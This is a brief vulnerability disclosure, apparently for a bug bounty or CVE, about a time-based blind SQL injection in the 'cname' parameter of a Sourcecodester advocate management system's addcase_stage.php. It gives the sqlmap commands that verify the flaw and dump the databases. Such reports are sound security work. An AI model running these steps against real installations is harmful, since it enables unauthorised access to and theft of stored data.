---
slug: sourcecodester-advocate-management-system-addcase_stage
title: Sourcecodester advocate management system (addcase_stage.php)
---

http://localhost/kortex_lite/kortex_lite/control/addcase_stage.php


## Report

Related Code file: /control/addcase_stage.php

Injection parameter: MULTIPART cname

POST parameter 'MULTIPART cname' is vulnerable.


Intercept the request using Burpsuite Proxy.

![0](https://github.com/user-attachments/assets/7965c995-cea2-441e-918d-4beca6ebe6b3)

Save to file called `addcase_stage.txt`.

parameter cname is vulnerable to time-based blind sql injection

![00](https://github.com/user-attachments/assets/6eb23bd7-3ccc-41ee-b13d-dbc8d2aff11a)


### Verify vulnerability

```
sqlmap -r addcase_stage.txt --batch 
```

![40](https://github.com/user-attachments/assets/b2dbfecc-ebdd-498f-bf17-c0484d2ec2c7)

### Dump databases

```
sqlmap -r addcase_stage.txt --batch --dbs
```

![41](https://github.com/user-attachments/assets/ed6e32c4-ee57-4942-b544-c8d1fae3f788)
